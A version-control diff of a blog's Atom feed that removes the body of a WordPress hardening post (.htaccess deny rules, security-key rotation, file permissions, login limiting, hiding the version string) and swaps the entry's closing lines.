-&lt;p&gt;Always download plugins from trustworthy sources. Even if you want a premium plugin, download them from sites like &lt;a href=&quot;https://themeforest.net/&quot;&gt;Themeforest&lt;/a&gt;, or from developer's website. Those free versions may be infected with malware or some backdoor that will make your site very easy to exploit. &lt;/p&gt;
-
-&lt;h1&gt;Hide your wp-config.php and .htaccess files&lt;/h1&gt;
-&lt;p&gt;The wp-config file contains very confidentional information about your website. To protect it from intrusion, you should add the following code to your .htaccess file to deny access to anyone else. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;lt;Files wp-config.php&amp;gt;;
-order allow,deny
-deny from all
-&amp;lt;/Files&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Same for .htaccess file.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;lt;Files .htaccess&amp;gt;
-order allow,deny
-deny from all
-&amp;lt;/Files&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;h1&gt;Change your WordPress Security Keys&lt;/h1&gt;
-
-&lt;pre&gt;
-define('AUTH_KEY',         'VatTc3WfW~dKdE~m=Hf_bvaH-)1+ko=IQ:!oiYW}o1H+[;LgP[QC981U+{K2w0d+');
-define('SECURE_AUTH_KEY',  '/@*MX4vaG(:8iMfx(V z$-4b&amp;lt;N;_((cA `nv/~,*tKiO6W}hUf+ t]rL[I9,m^o|');
-define('LOGGED_IN_KEY',    'c$Ou*1`?^+(:I4=Lpy6aD-HMl/1Jdg9y-J$1^(V+o&amp;gt;{TyE[q.$)Rtvm:q5j_itG.');
-define('NONCE_KEY',        '=+2:9RPE=0x`9!/l}qaYQ`{m)OW|s2I&amp;amp;Hnk=O4/;gwh}I+WGJCk2PmHK{1CIjhDm');
-define('AUTH_SALT',        '$5a?Qk1Rzfd{+r_/9XR%2&amp;lt;P+f1^QlQ|pJXMX&amp;gt;1ly-8&amp;lt;n%1J#IaE+O9xy=8(x/AWU');
-define('SECURE_AUTH_SALT', 'iehUhOYms(1fQzpacQTrfUR?s;g&amp;gt;9-?(Q=H0s:p!7pT@xmAu/o&amp;gt;90MI2NE1-z-ji');
-define('LOGGED_IN_SALT',   '$.[D]&amp;lt;Nm)N[gig#&amp;lt;Dc8|&amp;gt;FXr&amp;amp;+QMmN{sv(AgHM.=*Fdnz-)1YTBAOuJIr94w0Mo3');
-define('NONCE_SALT',       'kkv&amp;lt;g?I-JZ+J%xdS!~9vr&amp;gt;F4myL7hdgl++7Q|)I|,=^Jvh=8Ty-iiarrzK)P-sn|');
-&lt;/pre&gt;
-
-&lt;p&gt;WordPress Security Keys is a set of random variables that improve encryption of information stored in the user’s cookies. You should change them right after installation of your WordPress site. Use &lt;a href=&quot;https://api.wordpress.org/secret-key/1.1/salt&quot;&gt;this&lt;/a&gt; site to get new set of fresh keys and then change them in you wp-config.php file.  &lt;/p&gt;
-
-&lt;h1&gt;Change file permissions&lt;/h1&gt;
-
-&lt;p&gt;Having secure file permissions may vary from your hosting provider, some may have secure permissions to your files, and some won't bother about this leaving you with default settings. Avoid having directories with 777 permissions, instead opt for 755 or 750. Also set files to 640 or 644 and wp-config.php to 600.&lt;/p&gt;
-
-&lt;h1&gt;Limit login attempts&lt;/h1&gt;
-
-&lt;p&gt;As I mentioned before, many attackers try to gain access with automated brute force attacks. Easiest way would be to use plugin that will forbid certain IP address from accessing the wp-admin page after certain amounts of failed logins. Plugin such as &lt;a href=&quot;https://wordpress.org/plugins/all-in-one-wp-security-and-firewall/&quot;&gt;All In One WP Security &amp;amp; Firewall&lt;/a&gt; will allow you to change the URL of the login page - bots are programmed to look for wp-admin. &lt;/p&gt;
-
-&lt;p&gt;In addition to that use plugin limiting login attempts: &lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;https://wordpress.org/plugins/limit-login-attempts-reloaded/&quot;&gt;Limit Login Attempts Reloaded&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://wordpress.org/plugins/login-lockdown/&quot;&gt;Login Lockdown&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1&gt;Hide your WordPress version&lt;/h1&gt;
-
-&lt;p&gt;FIngerprinting WordPress is a huge issue, since from the attacker point of view - knowing the version will make it easier to find exploits. You can do this by adding this piece of code to your functions.php file. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-&lt;span class=&quot;cm&quot;&gt;/* Hide WP version strings from scripts and styles
- * @return {string} $src
- * @filter script_loader_src
- * @filter style_loader_src
- */&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fjarrett_remove_wp_version_strings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$src&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-     &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$wp_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-     &lt;span class=&quot;nb&quot;&gt;parse_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;parse_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PHP_URL_QUERY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ver'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ver'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$wp_version&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-          &lt;span class=&quot;nv&quot;&gt;$src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;remove_query_arg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ver'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;add_filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'script_loader_src'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'fjarrett_remove_wp_version_strings'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;add_filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'style_loader_src'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'fjarrett_remove_wp_version_strings'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-&lt;span class=&quot;cm&quot;&gt;/* Hide WP version strings from generator meta tag */&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;wpmudev_remove_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;add_filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'the_generator'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'wpmudev_remove_version'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;This will hide your WordPress version from all possible places. &lt;/p&gt;
-
-&lt;h1&gt;Last words&lt;/h1&gt;
-
-&lt;p&gt;Keeping your WordPress based site is very serious task, but following these tips will make it much safer than it was before, which undoubtedly will save you a lot of time in the future. But remember, there is no unhackable thing so always keep backups of your website, as in case of infection you will save more time than creating your site from scratch.  &lt;/p&gt;
-
-&lt;p&gt;I hope you learned something, from this article. As always remember and...&lt;/p&gt;
-
-&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Web Security" /><summary type="html">Introduction</summary></entry></feed>
+&lt;p&gt;~ W3ndige&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="News" /><summary type="html">Hey guys!</summary></entry></feed>
